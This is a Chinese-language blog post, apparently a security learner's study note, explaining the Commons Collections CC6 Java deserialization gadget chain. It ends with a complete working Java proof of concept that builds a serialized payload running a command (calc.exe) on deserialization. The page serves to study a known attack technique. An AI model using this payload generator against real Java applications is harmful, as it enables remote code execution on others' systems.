{"title":"Java反序列化3笔记","uid":"cc6f53e8dc634d13d7c94fb0decfd921","slug":"Java反序列化3笔记","date":"2022-09-11T09:54:16.000Z","updated":"2022-09-11T10:28:25.262Z","comments":true,"path":"api/articles/Java反序列化3笔记.json","keywords":null,"cover":[],"content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h1 id=\"参考资料：\"><a href=\"#参考资料：\" class=\"headerlink\" title=\"参考资料：\"></a>参考资料：</h1><p>p牛 Java安全漫谈 12   Java反序列化6</p>\n<p><a href=\"https://t.zsxq.com/05vVVfAeI\">https://t.zsxq.com/05vVVfAeI</a></p>\n<h1 id=\"Common-Collection6\"><a href=\"#Common-Collection6\" class=\"headerlink\" title=\"Common Collection6\"></a>Common Collection6</h1><p>前面学习cc1的时候发现cc1有版本限制问题，所以这个阶段来解决版本限制问题，一种通用的反序列化链，也就是cc6</p>\n<p>AnnotationInvocationHandler类的readobject逻辑发生改变，无法在通过其调用LazyMap的get方法，而CC6链则发现一种新的可以调用LazyMap的get方法的类，通过TiedMapEntry类触发Lazy的get方法</p>\n<h1 id=\"org-apache-commons-collections-keyvalue-TiedMapEntry\"><a href=\"#org-apache-commons-collections-keyvalue-TiedMapEntry\" class=\"headerlink\" title=\"org.apache.commons.collections.keyvalue.TiedMapEntry\"></a>org.apache.commons.collections.keyvalue.TiedMapEntry</h1><p>在其getValue方法中直接返回map.get(key)，在此处调用了输入map的get方法</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/1.PNG\"></p>\n<p>同时该类里的hashCode方法又无条件的调用了getValue方法</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/2.PNG\"></p>\n<p>在前面的利用链里，hashmap的readobject方法调用了hash方法，而在hash方法里又调用了key的hashcode方法，所以这个利用链就完整了</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/3.PNG\"></p>\n<p>只需让hash方法的key为TiedMapEntry对象即可触发该类的hashcode方法</p>\n<p>将前面CC1链中获取的恶意LazyMap对象作为TiedMapEntry的map属性，实例化一个TiedMapEntry对象</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">Map innerMap &#x3D; new HashMap();\n\nMap outerMap &#x3D; LazyMap.decorate(innerMap, transformerChain);\n\n&#x2F;&#x2F;通用链，使用TiedMapEntry\n\nTiedMapEntry tme &#x3D; new TiedMapEntry(outerMap, &quot;keykey&quot;);</code></pre>\n\n<p>之后将其转化为hashmap对象的key</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">Map expMap &#x3D; new HashMap();\n\nexpMap.put(tme, &quot;valuevalue&quot;);</code></pre>\n\n<p>接着就能直接序列化和反序列化试试</p>\n<p>发现可以序列化但是无法弹出计算器</p>\n<p>原因在于反序列化时LazyMap的get方法进行了一个判断，当这个输入的key不存在这个map中时才会执行put操作，而调式发现这里输入的key为前面的keykey，这个keykey是存在于map中的，所以没有进入if判断</p>\n<p>还有一个原因是p牛的代码中没有直接将恶意回调放在Lazy里，而是先放一个不执行命令的回调，在put之后修改这个回调为恶意回调</p>\n<p>在将TiedMapEntry对象设置为hashmap的key时执行力put操作，而put方法里又调用了hash(key)，所以调式时是在这里就触发了利用链，在p牛的代码中，这时的回调并不是命令执行的回调，才会导致无法执行命令</p>\n<p>将其换成执行命令的回调是会导致命令执行，但是并不是我们需要的反序列化时的执行，而是直接在执行put操作时就执行了命令</p>\n<p>所以为了解决这个问题，需要在put之后将keykey值移除，在修改回调为恶意回调</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/4.PNG\"></p>\n<p>为了明显查看，所以直接在前面就将回调设置为执行命令的回调，调式发现弹出来两次计算机，一次是在put时就弹出，一次是在readobject时弹出，说明前面的分析没有问题</p>\n<p>这个代码真是缺一不可，真巧妙</p>\n<h2 id=\"完整代码：\"><a href=\"#完整代码：\" class=\"headerlink\" title=\"完整代码：\"></a>完整代码：</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">package org.vulhub.sec;\n\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.keyvalue.TiedMapEntry;\nimport org.apache.commons.collections.map.LazyMap;\n\nimport java.io.*;\nimport java.lang.reflect.Field;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class CommonsCollections6 &#123;\n    public static void main(String[] args) throws Exception &#123;\n    \t&#x2F;&#x2F;防止本地调式在put时触发命令执行\n        Transformer[] fakeTransformers &#x3D; new Transformer[] &#123;new ConstantTransformer(1)&#125;;\n        Transformer[] transformers &#x3D; new Transformer[] &#123;\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,\n                        Class[].class &#125;, new Object[] &#123; &quot;getRuntime&quot;,\n                        new Class[0] &#125;),\n                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,\n                        Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),\n                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123; String.class &#125;,\n                        new String[] &#123; &quot;calc.exe&quot;&#125;),\n                new ConstantTransformer(1),\n        &#125;;\n        Transformer transformerChain &#x3D; new ChainedTransformer(fakeTransformers);\n\n        &#x2F;&#x2F; 不再使用原CommonsCollections6中的HashSet，直接使用HashMap\n        Map innerMap &#x3D; new HashMap();\n        Map outerMap &#x3D; LazyMap.decorate(innerMap, transformerChain);\n        &#x2F;&#x2F;通用链，使用TiedMapEntry\n        TiedMapEntry tme &#x3D; new TiedMapEntry(outerMap, &quot;keykey&quot;);\n\n        Map expMap &#x3D; new HashMap();\n        &#x2F;&#x2F;会触发一次利用链\n        expMap.put(tme, &quot;valuevalue&quot;);\n        &#x2F;&#x2F;移除掉以达到进入if判断，执行命令\n        outerMap.remove(&quot;keykey&quot;);\n\n        Field f &#x3D; ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);\n        f.setAccessible(true);\n        &#x2F;&#x2F;替换恶意transformer\n        f.set(transformerChain, transformers);\n\n        &#x2F;&#x2F; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n        &#x2F;&#x2F; 生成序列化字符串\n        ByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n        ObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n        oos.writeObject(expMap);\n        oos.close();\n\n        &#x2F;&#x2F; 本地测试触发\n        System.out.println(barr);\n        ObjectInputStream ois &#x3D; new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));\n        Object o &#x3D; (Object)ois.readObject();\n    &#125;\n&#125;</code></pre>\n\n","text":" 参考资料：p牛 Java安全漫谈 12 Java反序列化6 https://t.zsxq.com/05vVVfAeI Common Collection6前面学习cc1的时候发现cc1有版本限制问题，所以这个阶段来解决版本限制问题，一种通用的反序列化链，也就是cc6 Annot...","link":"","photos":[],"count_time":{"symbolsCount":"4.3k","symbolsTime":"4 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":11,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java","slug":"Java","count":20,"path":"api/tags/Java.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99%EF%BC%9A\"><span class=\"toc-text\">参考资料：</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Common-Collection6\"><span class=\"toc-text\">Common Collection6</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#org-apache-commons-collections-keyvalue-TiedMapEntry\"><span class=\"toc-text\">org.apache.commons.collections.keyvalue.TiedMapEntry</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81%EF%BC%9A\"><span class=\"toc-text\">完整代码：</span></a></li></ol></li></ol>","author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Java反序列化4笔记","uid":"28bef31494b30752ba9f1f07e41299e2","slug":"Java反序列化4笔记","date":"2022-09-13T14:10:44.000Z","updated":"2022-09-14T05:13:01.669Z","comments":true,"path":"api/articles/Java反序列化4笔记.json","keywords":null,"cover":null,"text":" 参考资料：p牛 Java安全漫谈 14 https://t.zsxq.com/05rjA2NJU p牛 JavaThings https://github.com/phith0n/JavaThings Common Collection3InvokerTransformerCC...","link":"","photos":[],"count_time":{"symbolsCount":"5.1k","symbolsTime":"5 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":11,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java","slug":"Java","count":20,"path":"api/tags/Java.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Java反序列化2笔记","uid":"40de76659604bae52b4863ba88be567d","slug":"Java反序列化2笔记","date":"2022-09-05T11:58:43.000Z","updated":"2022-09-06T04:28:09.026Z","comments":true,"path":"api/articles/Java反序列化2笔记.json","keywords":null,"cover":null,"text":"参考资料：p牛 Java安全漫谈 9 10 11反序列化3 4 5： https://t.zsxq.com/05MzN7miq https://t.zsxq.com/05AAAEYVN https://t.zsxq.com/05VVRfAea 前面了解了反序列化利用基础，和URL...","link":"","photos":[],"count_time":{"symbolsCount":"13k","symbolsTime":"12 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":11,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java","slug":"Java","count":20,"path":"api/tags/Java.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}